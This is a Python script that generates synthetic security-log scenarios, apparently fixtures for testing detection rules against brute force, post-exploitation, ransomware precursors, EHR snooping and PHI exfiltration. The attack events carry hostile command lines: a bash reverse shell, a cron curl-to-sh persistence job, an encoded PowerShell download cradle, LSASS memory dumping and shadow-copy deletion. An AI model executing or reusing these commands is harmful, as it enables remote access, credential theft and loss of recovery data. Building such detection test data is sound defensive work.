"""
generate.py
Builds the synthetic scenario datasets in data/scenarios/ (deterministic: same output
every run). All hosts, users, patients and addresses are fictional; IPs are from the
documentation ranges (RFC 5737) or private space.

    python data/generate.py
"""

import base64
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).parent / "scenarios"
T0 = datetime(2026, 10, 20, 9, 0, tzinfo=timezone.utc)

LINUX_SSH = {"product": "linux", "service": "sshd"}
LINUX_PROC = {"product": "linux", "category": "process_creation"}
WIN_PROC = {"product": "windows", "category": "process_creation"}
EHR = {"product": "ehr", "service": "audit"}
PROXY = {"category": "proxy"}


class Scenario:
    def __init__(self, name):
        self.name, self.events = name, []

    def add(self, seconds, logsource, **fields):
        event = {"_id": f"{self.name}-{len(self.events) + 1:03d}",
                 "@timestamp": (T0 + timedelta(seconds=seconds)).isoformat().replace("+00:00", "Z"),
                 "_logsource": logsource, **fields}
        self.events.append(event)


def ssh(s, t, outcome, user, ip, host="web01"):
    s.add(t, LINUX_SSH, action="login", outcome=outcome, user=user, source_ip=ip, host=host)


def proc(s, t, source, image, cmd, user, parent, host):
    s.add(t, source, Image=image, CommandLine=cmd, User=user, ParentImage=parent, host=host)


def ssh_bruteforce_root():
    s = Scenario("ssh_bruteforce_root")
    for i in range(12):  # 12 failures in 3 minutes from one address
        ssh(s, i * 15, "failure", ["root", "admin", "ubuntu"][i % 3], "203.0.113.45")
    ssh(s, 190, "success", "root", "203.0.113.45")
    return s


def linux_post_exploitation():
    s, host, web = Scenario("linux_post_exploitation"), "web01", "/usr/sbin/apache2"
    proc(s, 0, LINUX_PROC, "/bin/bash", "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'", "www-data", web, host)
    proc(s, 60, LINUX_PROC, "/usr/sbin/usermod", "usermod -aG sudo svc-backup", "root", "/bin/bash", host)
    proc(s, 90, LINUX_PROC, "/usr/bin/crontab", "crontab /tmp/.cache/jobs", "root", "/bin/bash", host)
    proc(s, 95, LINUX_PROC, "/bin/bash",
         "bash -c \"echo '*/5 * * * * root curl -s http://198.51.100.7/u.sh | sh' > /etc/cron.d/apt-update\"",
         "root", "/bin/bash", host)
    proc(s, 120, LINUX_PROC, "/bin/bash", "bash -c 'history -c && unset HISTFILE'", "root", "/bin/bash", host)
    return s


def ransomware_precursors():
    s, host = Scenario("ransomware_precursors"), "pharm-ws07"
    payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a')"
                               .encode("utf-16-le")).decode()
    proc(s, 0, WIN_PROC, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         f"powershell.exe -nop -w hidden -enc {payload}", "PHARM\\tech02", r"C:\Windows\explorer.exe", host)
    proc(s, 300, WIN_PROC, r"C:\Windows\System32\rundll32.exe",
         r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 664 C:\Users\Public\l.dmp full",
         "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\cmd.exe", host)
    proc(s, 900, WIN_PROC, r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet",
         "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\cmd.exe", host)
    proc(s, 905, WIN_PROC, r"C:\Windows\System32\bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled No",
         "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\cmd.exe", host)
    return s


def ehr_insider_snooping():
    s = Scenario("ehr_insider_snooping")
    for i in range(55):  # 55 different charts in 45 minutes
        s.add(i * 49, EHR, action="record_view", user="nurse.jdoe", patient_id=f"P{100200 + i}",
              patient_flags="", care_relationship=False, workstation="ICU-WS3")
    s.add(2800, EHR, action="record_view", user="nurse.jdoe", patient_id="P900001",
          patient_flags="vip,employee", care_relationship=False, workstation="ICU-WS3")
    s.add(2900, EHR, action="break_glass", user="nurse.jdoe", patient_id="P900002",
          justification=None, workstation="ICU-WS3")
    return s


def phi_exfiltration():
    s = Scenario("phi_exfiltration")
    s.add(0, PROXY, user="billing.mlee", http_method="POST", dest_domain="files.personal-drive.example",
          url_category="personal_cloud_storage", bytes_out=4_812_330, dlp_match="ssn,mrn,dob")
    return s


def benign_baseline():
    s = Scenario("benign_baseline")
    # SSH: a typo then success, and a script retrying 7 times (one below the threshold)
    ssh(s, 0, "failure", "alice", "10.0.0.12")
    ssh(s, 20, "success", "alice", "10.0.0.12")
    for i in range(7):
        ssh(s, 600 + i * 30, "failure", "deploy", "10.0.0.40")
    ssh(s, 900, "success", "deploy", "10.0.0.40")
    # Linux admin work that resembles the attack rules
    host = "web01"
    proc(s, 1000, LINUX_PROC, "/usr/bin/crontab", "crontab -l", "alice", "/bin/bash", host)
    proc(s, 1010, LINUX_PROC, "/usr/sbin/visudo", "visudo -c -f /etc/sudoers", "root", "/bin/bash", host)
    proc(s, 1020, LINUX_PROC, "/usr/bin/cat", "cat /etc/sudoers.d/README", "root", "/bin/bash", host)
    proc(s, 1030, LINUX_PROC, "/bin/bash", "bash -c 'history | tail -20'", "alice", "/bin/bash", host)
    proc(s, 1040, LINUX_PROC, "/usr/sbin/usermod", "usermod -aG docker alice", "root", "/bin/bash", host)
    proc(s, 1050, LINUX_PROC, "/usr/bin/curl", "curl -fsS https://status.example.org/health", "alice",
         "/bin/bash", host)
    # Windows admin work
    w = "pharm-ws01"
    proc(s, 2000, WIN_PROC, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         r"powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\inventory.ps1", "PHARM\\it.admin",
         r"C:\Windows\System32\svchost.exe", w)
    proc(s, 2010, WIN_PROC, r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe list shadows", "PHARM\\it.admin",
         r"C:\Windows\System32\cmd.exe", w)
    proc(s, 2020, WIN_PROC, r"C:\Windows\System32\wbem\wmic.exe", "wmic.exe shadowcopy list brief",
         "PHARM\\it.admin", r"C:\Windows\System32\cmd.exe", w)
    proc(s, 2030, WIN_PROC, r"C:\Tools\procdump64.exe", r"procdump64.exe -ma chrome.exe C:\Temp\chrome.dmp",
         "PHARM\\it.admin", r"C:\Windows\System32\cmd.exe", w)
    # EHR: a busy physician (25 charts in an hour), a VIP on their own care team,
    # and an emergency override with a documented reason
    for i in range(25):
        s.add(3000 + i * 120, EHR, action="record_view", user="dr.patel", patient_id=f"P300{i:03d}",
              patient_flags="", care_relationship=True, workstation="ED-WS1")
    s.add(6100, EHR, action="record_view", user="dr.patel", patient_id="P900001",
          patient_flags="vip,employee", care_relationship=True, workstation="ED-WS1")
    s.add(6200, EHR, action="break_glass", user="dr.patel", patient_id="P400777",
          justification="Unresponsive trauma patient in ED bay 4", workstation="ED-WS1")
    # Proxy: PHI to sanctioned storage, a personal upload without PHI, a download
    s.add(7000, PROXY, user="billing.mlee", http_method="POST", dest_domain="hospital.box.example",
          url_category="sanctioned_cloud_storage", bytes_out=812_004, dlp_match="mrn")
    s.add(7100, PROXY, user="billing.mlee", http_method="PUT", dest_domain="files.personal-drive.example",
          url_category="personal_cloud_storage", bytes_out=20_311, dlp_match="")
    s.add(7200, PROXY, user="billing.mlee", http_method="GET", dest_domain="files.personal-drive.example",
          url_category="personal_cloud_storage", bytes_out=1_200, dlp_match="")
    return s


SCENARIOS = [ssh_bruteforce_root, linux_post_exploitation, ransomware_precursors,
             ehr_insider_snooping, phi_exfiltration, benign_baseline]


def build() -> dict[str, str]:
    """Return {filename: JSONL text} for every scenario."""
    out = {}
    for make in SCENARIOS:
        s = make()
        out[f"{s.name}.jsonl"] = "".join(json.dumps(e, sort_keys=True) + "\n" for e in s.events)
    return out


if __name__ == "__main__":
    OUT.mkdir(exist_ok=True)
    for name, text in build().items():
        (OUT / name).write_text(text, encoding="utf-8")
        print(f"wrote {OUT / name} ({text.count(chr(10))} events)")
